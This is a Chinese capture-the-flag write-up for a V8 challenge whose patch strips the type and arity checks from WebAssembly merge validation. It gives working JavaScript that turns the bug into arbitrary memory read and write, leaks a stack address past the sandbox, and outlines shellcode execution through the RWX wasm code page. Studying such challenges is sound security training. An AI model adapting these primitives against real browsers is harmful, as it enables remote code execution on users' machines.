## no_check_WASM writeup

查看题目给的patch.diff，其中涉及到漏洞的patch如下：

```cpp
diff --git a/src/wasm/function-body-decoder-impl.h b/src/wasm/function-body-decoder-impl.h
index b65ba5b9675..163fc536138 100644
--- a/src/wasm/function-body-decoder-impl.h
+++ b/src/wasm/function-body-decoder-impl.h
@@ -7878,27 +7878,27 @@ class WasmFullDecoder : public WasmDecoder<ValidationTag, decoding_mode> {
     // if the current code is reachable even if it is spec-only reachable.
     if (V8_LIKELY(decoding_mode == kConstantExpression ||
                   !control_.back().unreachable())) {
-      if (V8_UNLIKELY(strict_count ? actual != arity : actual < arity)) {
-        this->DecodeError("expected %u elements on the stack for %s, found %u",
-                          arity, merge_description, actual);
-        return false;
-      }
-      // Typecheck the topmost {merge->arity} values on the stack.
-      Value* stack_values = stack_.end() - arity;
-      for (uint32_t i = 0; i < arity; ++i) {
-        Value& val = stack_values[i];
-        Value& old = (*merge)[i];
-        if (!IsSubtypeOf(val.type, old.type, this->module_)) {
-          this->DecodeError("type error in %s[%u] (expected %s, got %s)",
-                            merge_description, i, old.type.name().c_str(),
-                            val.type.name().c_str());
-          return false;
-        }
-        if constexpr (static_cast<bool>(rewrite_types)) {
-          // Upcast type on the stack to the target type of the label.
-          val.type = old.type;
-        }
-      }
+      // if (V8_UNLIKELY(strict_count ? actual != arity : actual < arity)) {
+      //   this->DecodeError("expected %u elements on the stack for %s, found %u",
+      //                     arity, merge_description, actual);
+      //   return false;
+      // }
+      // // Typecheck the topmost {merge->arity} values on the stack.
+      // Value* stack_values = stack_.end() - arity;
+      // for (uint32_t i = 0; i < arity; ++i) {
+      //   Value& val = stack_values[i];
+      //   Value& old = (*merge)[i];
+      //   if (!IsSubtypeOf(val.type, old.type, this->module_)) {
+      //     this->DecodeError("type error in %s[%u] (expected %s, got %s)",
+      //                       merge_description, i, old.type.name().c_str(),
+      //                       val.type.name().c_str());
+      //     return false;
+      //   }
+      //   if constexpr (static_cast<bool>(rewrite_types)) {
+      //     // Upcast type on the stack to the target type of the label.
+      //     val.type = old.type;
+      //   }
+      // }
       return true;
     }
     // Unreachable code validation starts here.
```

其上层函数为：

```cpp
template <StackElementsCountMode strict_count,
          PushBranchValues push_branch_values, MergeType merge_type,
          RewriteStackTypes rewrite_types>
V8_INLINE bool TypeCheckStackAgainstMerge(Merge<Value>* merge) {
  uint32_t arity = merge->arity;
  uint32_t actual = stack_.size() - control_.back().stack_depth;
  // Handle trivial cases first. Arity 0 is the most common case.
  if (arity == 0 && (!strict_count || actual == 0)) return true;
  // Arity 1 is still common enough that we handle it separately (only doing
  // the most basic subtype check).
  if (arity == 1 && (strict_count ? actual == arity : actual >= arity)) {
    if (stack_.back().type == merge->vals.first.type) return true;
  }
  return TypeCheckStackAgainstMerge_Slow<strict_count, push_branch_values,
                                         merge_type, rewrite_types>(merge);
}
```

想进入TypeCheckStackAgainstMerge_Slow只需要参数个数大于1即可，该函数是针对于merge point的检查，以下是几种MergeType：

```cpp
// src/wasm/function-body-decoder-impl.h
enum MergeType {
  kBranchMerge,
  kReturnMerge,
  kFallthroughMerge,
  kInitExprMerge
};
```

wasm引擎在解析wasm函数的时候一般都会调用到TypeCheckStackAgainstMerge，如果使用loop也是可以调用到TypeCheckStackAgainstMerge函数的：

```cpp
const builder = new WasmModuleBuilder();
let $sig_v_v = builder.addType(kSig_v_v);
let $sig_llll_v = builder.addType(makeSig([], [kWasmI64,kWasmI64,kWasmI64,kWasmI64]));


builder.addFunction('main',$sig_v_v).exportFunc()
.addBody([
  kExprLoop,$sig_llll_v,
  kExprBr,0,
  kExprEnd
]);

let instance = builder.instantiate();
let main = instance.exports.main;
```

回到漏洞本身，由于我们删除了对于参数类型和个数的判断，那么我们就可以很简单的实现wasm type的类型混淆来进行任意地址读写，i64和wasm struct混淆：

```javascript
let $sig_struct_l = builder.addType(makeSig([kWasmI64],[wasmRefType($struct)]));
let $sig_v_ll = builder.addType(makeSig([kWasmI64,kWasmI64],[]));
let $sig_l_l = builder.addType(makeSig([kWasmI64],[kWasmI64]));

let i64ToWasmStruct = builder.addFunction('i64_to_WasmStruct',$sig_struct_l).exportFunc()
.addBody([
  kExprLocalGet,0,
]);

builder.addFunction('arb_write',$sig_v_ll).exportFunc()
.addBody([
  kExprLocalGet,0,
  kExprCallFunction,i64ToWasmStruct.index,
  kExprLocalGet,1,
  kGCPrefix, kExprStructSet, $struct, 0,
]);

builder.addFunction('arb_read',$sig_l_l).exportFunc()
.addBody([
  kExprLocalGet,0,
  kExprCallFunction,i64ToWasmStruct.index,
  kGCPrefix, kExprStructGet, $struct, 0,
]);
```

有了任意地址读写，还需要一个raw pointer来逃逸v8的沙箱，这个可以依靠构造函数参数个数不匹配的来实现：

```javascript
let $sig_v_ll = builder.addType(makeSig([kWasmI64,kWasmI64],[]));
let $sig_v_v = builder.addType(kSig_v_v);
let $sig_lll_v = builder.addType(makeSig([], [kWasmI64,kWasmI64,kWasmI64]));
let $sig_v_lll = builder.addType(makeSig([kWasmI64,kWasmI64,kWasmI64], []));

let leak_stack_func = builder.addImport("import", "leak_func", $sig_v_ll);
let nop_func = builder.addFunction('nop',$sig_lll_v).exportFunc()
.addLocals(kWasmI64,1)
  .addBody([
]);

let call_leak_func = builder.addFunction('foo',$sig_v_lll).exportFunc()
  .addBody([
    kExprLocalGet,0,
    kExprLocalGet,1,
    kExprCallFunction,leak_stack_func,
]);

builder.addFunction('leak',$sig_v_v).exportFunc()
  .addBody([
    kExprCallFunction,nop_func.index,
    kExprCallFunction,call_leak_func.index,
]);

let stack_addr = 0n;

function leak_stack(high,low) {
  stack_addr = (high << 32n) + low;
}

let instance = builder.instantiate({
  import: {
    leak_func: leak_stack,
  }
});
```

有了栈地址，我们就依靠任意地址读写来泄露栈上的内容，泄露出wasm code所在的rwx page的地址，我们只需要修改其中任意函数的内容在调用就可以实现执行shellcode了，详情请见exp.js。